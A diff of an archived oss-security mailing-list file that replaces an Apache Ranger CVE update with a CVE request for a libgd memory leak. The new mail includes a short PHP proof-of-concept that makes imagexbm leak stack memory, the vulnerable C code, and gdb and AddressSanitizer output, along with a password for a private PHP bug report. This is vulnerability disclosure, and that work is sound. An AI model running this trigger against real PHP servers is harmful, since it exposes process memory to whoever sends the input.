@@ -1,41 +1,88 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/05/1
-Message-ID: <D2D9A4C5.114ECA%vel@apache.org>
-Date: Fri, 05 Feb 2016 01:00:53 -0500
-From: Velmurugan Periasamy <vel@...che.org>
-To: "dev@...ger.incubator.apache.org" <dev@...ger.incubator.apache.org>, <user@...ger.incubator.apache.org>, <security@...che.org>, <oss-security@...ts.openwall.com>, <bugtraq@...urityfocus.com>
-CC: Velmurugan Periasamy <vel@...che.org>, <private@...ger.incubator.apache.org>
-Subject: CVE update (CVE-2015-5167 & CVE-2016-0733) - Fixed in Ranger 0.5.1
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/29/3
+Message-ID: <CAEr-gPHkGeMp-k75G5X3MNutXvNx9Q35uYtYrKcdGsH_0wUKQQ@mail.gmail.com>
+Date: Sun, 29 May 2016 12:43:34 -0500
+From: Fernando Muñoz <fernando@...l-life.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: libgd - gdCtxPrintf memory leak
 Content-Type: text/plain; charset=utf-8
 
-Hello:
+libgd report:
+https://github.com/libgd/libgd/issues/211
 
-Here¹s a CVE update for Ranger 0.5.1 release. Please see below details.
+PHP report:
+https://bugs.php.net/bug.php?id=72115 - password 18c90f75
 
-Thank you,
-Velmurugan Periasamy
+Fix:
+https://github.com/libgd/libgd/commit/4dc1a2d7931017d3625f2d7cff70a17ce58b53b4
 
---------------------------------------------------------------------------
-CVE-2015-5167: Restrict REST API data access for non-admin users
---------------------------------------------------------------------------
-Severity: Important
-Vendor: The Apache Software Foundation
-Versions Affected: 0.4.0 and 0.5.0 version of Apache Ranger
-Users affected: All users of ranger policy admin tool
-Description: Data access restrictions via REST API are not consistent with
-restrictions in policy admin UI.
-Mitigation: Users should upgrade to Ranger 0.5.1 version
---------------------------------------------------------------------------
-CVE-2016-0733: Ranger Admin authentication issue
---------------------------------------------------------------------------
-Severity: Important
-Vendor: The Apache Software Foundation
-Versions Affected: 0.4.0 and 0.5.0 version of Apache Ranger
-Users affected: All users of ranger policy admin tool
-Description: Malicious Users can gain access to ranger admin UI without
-proper authentication
-Mitigation: Users should upgrade to Ranger 0.5.1 version
---------------------------------------------------------------------------
+Credit: Fernando Muñoz and Marcelo Echeverria
+
+While creating an XBM image (imagexbm) with an user supplied name,
+libgd isn't checking the vsnprintf return value and PHP 5.5 will trust
+this length and read more memory than it should, causing a read-out-of
+boundaries, leaking stack memory.
+
+vsnprintf man: "a return value of size or more means that the output
+was truncated".
+
+PHP devs marked it as a "not a bug" because the bundled version of
+libgd with PHP 5.5 is not vulnerable, however using PHP with
+systemwide libgd is a common practice. PHP 5.6 and PHP 7 are not
+vulnerable to this issue because another bugfix prevents this from
+being exploited [1].
+
+Test script (PHP 5.5 and systemwide libgd):
+<?php
+$var1=imagecreatetruecolor ( 2 , 2);
+$var2=str_repeat("ABCD", 1030);
+imagexbm($var1, $var2, 0);
 
 
+Affected code:
+/* {{{ gdCtxPrintf */
+static void gdCtxPrintf(gdIOCtx * out, const char *format, ...)
+{
+    char buf[4096];
+    int len;
+    va_list args;
 
+    va_start(args, format);
+    len = vsnprintf(buf, sizeof(buf)-1, format, args);
+     // -----> if len > 4096 data was truncated
+     // -----> but libgd returns this value as is
+    va_end(args);
+    out->putBuf(out, buf, len);
+}
+
+
+Debug:
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/php/php-55/sapi/cli/php -n
+-dextension=/home/user/php/php-55/modules/gd.so /home/user/img.php
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, _php_image_output_putbuf (ctx=0xb46ddf38,
+buf=0xbfffa69c, l=8017) at /home/user/php/php-55/ext/gd/gd_ctx.c:39
+39              return php_write((void *)buf, l TSRMLS_CC);
+(gdb) print l
+$7 = 8017
+
+PHP will use 8017 as string length.
+
+ASAN:
+#define ABCD... <random stuff from memory> ...
+==============================================
+ERROR: AddressSanitizer: stack-buffer-underflow on address
+0xbfffb750 at pc 0xb7aa6dbd bp 0xbfffa408 sp 0xbfff9fdc
+READ of size 8017 at 0xbfffb750 thread T0
+                                       #0 0xb7aa6dbc
+(/usr/lib/i386-linux-gnu/libasan.so.2+0x3ddbc)
+    #1 0x99388cf in sapi_cli_single_write
+/home/user/php/php-55/sapi/cli/php_cli.c:273
+
+
+[1] https://bugs.php.net/bug.php?id=66339
